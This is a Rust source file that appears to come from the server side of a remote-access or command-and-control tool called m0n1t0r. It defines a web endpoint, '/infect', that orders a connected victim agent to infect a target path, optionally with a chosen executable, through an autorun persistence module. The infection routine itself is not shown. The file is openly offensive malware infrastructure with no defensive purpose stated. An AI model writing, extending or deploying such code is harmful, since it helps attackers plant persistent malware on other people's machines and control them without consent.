use crate::{
    ServerMap,
    web::{Response, Result as WebResult, api::client::autorun},
};
use actix_web::{
    Responder, post,
    web::{Data, Form, Json, Path},
};
use m0n1t0r_common::autorun::Agent as _;
use serde::Deserialize;
use std::{net::SocketAddr, path::PathBuf, sync::Arc};
use tokio::sync::RwLock;

#[derive(Deserialize)]
struct InfectForm {
    target: PathBuf,
    exe: Option<PathBuf>,
}

#[post("/infect")]
pub async fn post(
    data: Data<Arc<RwLock<ServerMap>>>,
    addr: Path<SocketAddr>,
    Form(form): Form<InfectForm>,
) -> WebResult<impl Responder> {
    let (agent, _) = autorun::agent(data, &addr).await?;

    Ok(Json(Response::success(match form.exe {
        Some(exe) => agent.infect_at(form.target, exe).await?,
        None => agent.infect(form.target).await?,
    })?))
}
